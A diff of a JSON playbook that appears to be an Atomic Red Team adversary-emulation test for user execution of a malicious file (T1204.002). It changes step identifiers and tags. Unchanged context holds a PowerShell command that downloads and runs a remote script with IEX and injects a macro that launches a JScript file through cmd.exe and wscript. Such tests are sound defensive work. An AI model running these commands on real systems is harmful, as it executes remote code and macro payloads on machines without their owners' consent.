@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "70ba9bdd-5339-4cfe-bbb6-cb680c2ec2a6",
+      "id": "4e318fde-2f81-4885-b149-72d1a24f5436",
       "type": "execute-command",
       "data": {
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "6d4970d9-5487-4b00-8e01-6f39e4b475dd",
+      "id": "ef16f731-deb4-4ccf-bb40-184ae54695dd",
       "name": "Check dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "ae0ef130-d69a-41ee-9448-dac0fc48ee6a",
+      "id": "41582597-0611-4ed0-8f7e-2c149bc2f0dc",
       "name": "Resolve dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "ccde9d73-8961-42dd-945c-80d7a1df9bc5",
+      "id": "728b9b08-b5df-4c15-9bd7-c82e7cc4c723",
       "name": "Re-check dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -51,29 +51,29 @@
   ],
   "flows": [
     {
-      "s": "6d4970d9-5487-4b00-8e01-6f39e4b475dd",
+      "s": "ef16f731-deb4-4ccf-bb40-184ae54695dd",
       "p": "on-success",
-      "o": "70ba9bdd-5339-4cfe-bbb6-cb680c2ec2a6"
+      "o": "4e318fde-2f81-4885-b149-72d1a24f5436"
     },
     {
-      "s": "6d4970d9-5487-4b00-8e01-6f39e4b475dd",
+      "s": "ef16f731-deb4-4ccf-bb40-184ae54695dd",
       "p": "on-failure",
-      "o": "ae0ef130-d69a-41ee-9448-dac0fc48ee6a"
+      "o": "41582597-0611-4ed0-8f7e-2c149bc2f0dc"
     },
     {
-      "s": "ae0ef130-d69a-41ee-9448-dac0fc48ee6a",
+      "s": "41582597-0611-4ed0-8f7e-2c149bc2f0dc",
       "p": "on-success",
-      "o": "ccde9d73-8961-42dd-945c-80d7a1df9bc5"
+      "o": "728b9b08-b5df-4c15-9bd7-c82e7cc4c723"
     },
     {
-      "s": "ccde9d73-8961-42dd-945c-80d7a1df9bc5",
+      "s": "728b9b08-b5df-4c15-9bd7-c82e7cc4c723",
       "p": "on-failure",
-      "o": "70ba9bdd-5339-4cfe-bbb6-cb680c2ec2a6"
+      "o": "4e318fde-2f81-4885-b149-72d1a24f5436"
     }
   ],
   "tags": [
-    "T1204.002",
-    "atomic-red-team"
+    "T1204",
+    "T1204.002"
   ],
   "input_arguments": [
     {
